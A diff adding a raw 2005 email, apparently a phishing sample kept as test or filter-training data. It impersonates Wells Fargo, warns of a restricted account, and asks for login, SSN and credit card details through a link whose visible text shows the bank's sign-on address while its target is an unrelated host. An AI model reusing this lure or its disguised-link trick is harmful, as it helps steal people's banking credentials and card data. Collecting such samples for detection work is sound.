@@ -1,0 +1,109 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id A506A2A88C
+ for <user@example.com>; Mon, 15 Aug 2005 22:00:39 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 7FDB8621C99; Mon, 15 Aug 2005 22:00:39 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 40CDB621C95
+ for <user@example.com>; Mon, 15 Aug 2005 22:00:39 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id WAA29646
+ for user@example.com; Mon, 15 Aug 2005 22:00:38 -0400
+Received: from franz.inode.at (franz.inode.at [213.229.60.16])
+ by mail.example.com with ESMTP id WAA29638
+ for <user@example.com>; Mon, 15 Aug 2005 22:00:37 -0400
+Received: from www-data by franz.inode.at with local (Exim 4.31)
+ id 1E4qkm-0006rE-K8
+ for user@example.com; Tue, 16 Aug 2005 04:00:36 +0200
+To: user@example.com
+Subject: updated your billing information
+From: "security@wellsfargo.com" <security@wellsfargo.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1E4qkm-0006rE-K8@franz.inode.at>
+Date: Tue, 16 Aug 2005 04:00:36 +0200
+Content-Length: 3298
+Lines: 74
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 88
+
+<html dir="ltr">
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>New Page 1</title>
+</head>
+
+<body>
+
+<table id="masthead" cellSpacing="0">
+	<tr>
+		<td id="mastLeftCol" noWrap><a href="http://www.wellsfargo.com/">
+		<img id="logo" alt="Wells Fargo Home Page" src="http://a248.e.akamai.net/7/248/1856/53845d4a1846e7/www.wellsfargo.com/img/header/logo_62sq.gif" width="62" height="62"><img id="coach" alt="Wells Fargo Home Page" src="http://a248.e.akamai.net/7/248/1856/53845d4a1846e7/www.wellsfargo.com/img/header/coach.gif"></a><a href="http://www.wellsfargo.com/auxiliary_access/aa_talkatmloc.jhtml"><img class="inline" height="1" alt="Talking ATM Locations" src="//a248.e.akamai.net/7/248/1856/5472601571f31e/www.wellsfargo.com/img/s.gif" width="1" border="0"></a><a href="#skip"><img class="inline" height="1" alt="Skip Navigation to go to main content of this page" src="//a248.e.akamai.net/7/248/1856/5472601571f31e/www.wellsfargo.com/img/s.gif" width="1" border="0"></a></td>
+	</tr>
+</table>
+<p><br>
+Dear customers:<br>
+<br>
+Wells Fargo is constantly working to increase security for all Online Banking 
+users. To ensure the integrity of our online payment system, we periodically 
+review accounts.<br>
+<br>
+Your account might be place on restricted status. Restricted accounts continue 
+to receive payments, but they are limited in their ability to send or withdraw 
+funds.<br>
+<br>
+To lift up this restriction, you need to login into your account (with your 
+username or SSN and your password), then you have to complete our verification 
+process. You must confirm your credit card details and your billing information 
+as well. All restricted accounts have their billing information unconfirmed, 
+meaning that you may no longer send money from your account until you have 
+updated your billing information on file.<br>
+To initiate the billing update confirmation process, please follow the link 
+bellow and fill in the necessary fields:<br>
+<br>
+<a href="http://www.dmm.at/www.wellsfargo.com/wells/">
+https://online.wellsfargo.com/signon?LOB=CONS</a><br>
+<br>
+Thank you,<br>
+<br>
+Wells Fargo - Online Banking</p>
+<p> </p>
+<div id="canvas">
+	<table cellSpacing="0" cellPadding="0" width="100%" border="0">
+		<tr>
+			<td vAlign="top">
+			<div id="bodyCell">
+				<div class="separator">
+					<img height="1" alt="" src="https://a248.e.akamai.net/7/248/3608/1d8352905f2c38/online.wellsfargo.com/common/images/shim.gif" width="1"></div>
+				<div class="footer1" style="WIDTH: 100%; TEXT-ALIGN: center">
+					<a tabIndex="8" href="http://www.wellsfargo.com/about/about.jhtml">
+					About Wells Fargo</a> |
+					<a tabIndex="8" href="http://www.wellsfargo.com/employment">
+					Employment</a> |
+					<a tabIndex="8" href="http://www.wellsfargo.com/privacy_security/email_fraud/report.jhtml">
+					Report Email Fraud</a> |
+					<a tabIndex="8" href="http://www.wellsfargo.com/privacy_security/index.jhtml">
+					Privacy, Security & Legal</a> |
+					<a title="Wells Fargo Home" tabIndex="8" href="http://www.wellsfargo.com">
+					Home</a> </div>
+				<div class="disclosure" style="MARGIN-TOP: 9px; WIDTH: 100%; TEXT-ALIGN: center">
+					© 1995 - 2005 Wells Fargo. All rights reserved. </div>
+			</div>
+			</td>
+		</tr>
+	</table>
+</div>
+
+</body>
+
+</html>
+
+
+
